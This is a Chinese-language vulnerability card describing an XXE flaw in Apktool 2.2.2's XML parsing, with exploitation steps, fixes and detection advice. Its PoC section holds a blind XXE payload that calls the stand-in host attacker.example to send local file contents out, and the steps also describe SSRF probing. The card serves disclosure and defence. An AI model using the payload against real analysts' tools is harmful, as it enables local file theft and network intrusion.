---
id: tools-apktool-xml-parser-xxe-manifest-strings
title: Apktool XML 解析 XXE：loadDocument 未禁用 DOCTYPE/外部实体，解析恶意 AndroidManifest/strings.xml 时读取本地文件并外带
type: scenario
domain: tools
path: tools
technique: apktool-documentbuilderfactory-xxe
aliases:
- Apktool XXE
- loadDocument XXE
- pullValueFromStrings XXE
- fixingPublicAttrsInProviderAttributes
- 恶意 APK 攻击逆向分析者
- AndroidManifest.xml XXE
tags:
- apktool
- xxe
- android
- reverse-engineering
- tool-vulnerability
- documentbuilderfactory
- oob
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: 2.2.2（原文复现 commit 499c2f9039ba55c2bbc4ab7dc7b28c6e6cb78d92）
verification:
  verified_by: verifier-V592
  verified_at: '2026-11-12T15:37:54+08:00'
  notes: 已对照原文/截图核对 loadDocument 未禁用DOCTYPE/外部实体、fixingPublicAttrsInProviderAttributes 调用点(img01)、pullValueFromStrings 解析strings.xml攻击面(img02, thinkycx博文)、dnslog b5g7im 回连(img03)；decode投递因resources.arsc字符串不连续未成功(img04-06)，卡片已注明限制。2.2.2为原文回退复现版本，未猜修复区间；最终本地文件读取未在原文跑通。
---

## 一句话结论

Apktool 2.2.2 的 `loadDocument` 直接用 `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse()` 解析 XML，没有禁用 DOCTYPE 与外部实体；恶意 XML（AndroidManifest.xml 或 res/values/strings.xml）被 `fixingPublicAttrsInProviderAttributes`/`pullValueFromStrings` 解析时，分析机就会请求攻击者控制的 DTD/实体地址（DNS/HTTP 外带），并可进一步用 `file://` 实体读取本地文件——攻击面是"逆向工具打开不可信样本"。

## 原理

- **默认不安全的解析器**：Java `DocumentBuilderFactory` 默认允许 DOCTYPE 声明与外部通用/参数实体。`loadDocument(File)` 只 `newInstance()` 后直接 `parse(file)`，未设置 `disallow-doctype-decl`、`load-external-dtd`，也未限制 `ACCESS_EXTERNAL_DTD/SCHEMA`。
- **调用点**：`ResXmlPatcher.fixingPublicAttrsInProviderAttributes(manifest)` 在 build 流程解析解码后的 `AndroidManifest.xml`（image 01）；`ResXmlPatcher.pullValueFromStrings` 在拼装版本名等资源时解析 `res/values/strings.xml`（image 02，thinkycx 博文归纳的"新攻击面 strings.xml"）。两者都走同一个未加固的 `loadDocument`。
- **触发效果**：XML 里的 `<!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://attacker/dtd"> %dtd; %all; %send; ]>` 会让解析器访问外部 DTD 并展开实体；`<!ENTITY xxe SYSTEM "file:///c:/secret">` 可把本地文件内容替换进文档，配合外部 DTD 把内容拼进请求 URL 外带（盲 XXE OOB）。文章用 dnslog 构造恶意 XML 测试，记录到 `b5g7im.dnslog.cn` 的多次 DNS 查询（image 03），证明解析器确实发起了外部实体请求。
- **修复**：`loadDocument` 增加 `docFactory.setFeature(FEATURE_DISABLE_DOCTYPE_DECL, true)`、`setFeature(FEATURE_LOAD_DTD, false)`（关闭 DOCTYPE 与外部 DTD），并 `setAttribute(ACCESS_EXTERNAL_DTD, " ")`、`ACCESS_EXTERNAL_SCHEMA, " "`（JAXP 1.5+ 禁止外部 DTD/Schema 访问）。
- **投递限制（原文实测）**：build 方向要恶意 XML 留在待构建项目里；decode 方向则需要 DTD 存在于 APK 内的 XML 中——文章尝试用 010 Editor 直接改 `resources.arsc` 里 strings.xml 的字符串池，因资源表字符串并非按文件连续分布且 APK 重打包会重建资源表，最终没有构造出稳定可投递的恶意 APK（image 04-06），因此"完整攻击链"只到解析器触发外带这一步。

## 触发条件

- 使用未修复（2.2.2 及同代）Apktool 处理攻击者控制的 XML/项目/APK。
- XML 解析路径能拿到含 DOCTYPE/外部实体的内容：`AndroidManifest.xml`（`apktool b` 时 `fixingPublicAttrsInProviderAttributes`）或 `res/values/strings.xml`（`pullValueFromStrings`）；decode 路径只有在 APK 资源表里保留 DTD 字符串时才成立。
- 分析机可出网访问攻击者 DTD 服务，或本地文件可被 `file://` 实体读取。
- 分析环境未做网络隔离/沙箱（否则外带受限，但本地读取/SSRF 仍可能成立）。

## 利用步骤

1. 准备带外部实体的 XML，例如在 `AndroidManifest.xml`/`strings.xml` 中加入 DOCTYPE 与参数实体，外部 DTD 指向攻击者 HTTP 服务（文章用 dnslog 验证）。
2. 让目标使用未修复 Apktool 触发解析：build 方向把恶意 XML 放进项目执行 `apktool b`；decode 方向构造资源表中带该字符串的 APK。
3. 观察 DNS/HTTP 回连（外带通道），或在外部 DTD 中定义读取本地文件的实体并拼进回连 URL。
4. 从回连内容/后续请求中提取敏感文件内容；也可用实体探测内网服务（SSRF）。

## PoC

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.example/dtd">
  %dtd;
  %all;
  %send;
]>
<resources>
  <string name="app_name">My Application</string>
  <string name="test">aaaa</string>
</resources>
```

外部 DTD（attacker.example/dtd）按盲 XXE 模板定义 `%all;` 读取 `file:///` 目标文件并拼接到 `%send;` 的 HTTP 请求中。原文用 deflate/DNS 日志验证了外部实体请求确实发出（image 03），但完整"恶意 APK → decode 触发"投递未成功，故本 PoC 仅为载荷形态示意，未在本机执行。

## 变体与关联

- 变体：把恶意 XML 放在构建项目而非 APK 内（build 时解析）；用通用实体 + 外部 DTD 组合做文件读取而非仅盲外带；同一类"逆向/分析工具解析不可信样本导致 XXE"在其它 Android 工具上同样存在。
- 关联卡片：[[tools-jadx-xxe-xmlsecurity-not-used-manifest-parser]]（JADX 同类 XXE：XmlSecurity 已实现但 parseXml 未调用）、[[tools-apktool-unknownfiles-decode-path-traversal-arbitrary-write]]（同工具另一处不可信输入处理缺陷）。

## 检测与防御

- **升级/加固**：使用禁用 DOCTYPE 与外部 DTD/Schema 的修复版 Apktool；同类自研工具统一走安全 XML 工厂（`disallow-doctype-decl=true`、关闭外部实体）。
- **运行环境**：逆向分析不可信样本时断网/限制出网、在沙箱与低权限账户下运行，避免读取本机敏感文件与外带。
- **检测**：分析工具进程发起指向非常见域名的 DNS/HTTP 请求；XML 样本中出现 `<!DOCTYPE`/`<!ENTITY`/`SYSTEM` 组合；文件访问审计发现分析工具读取与其功能无关的敏感路径。
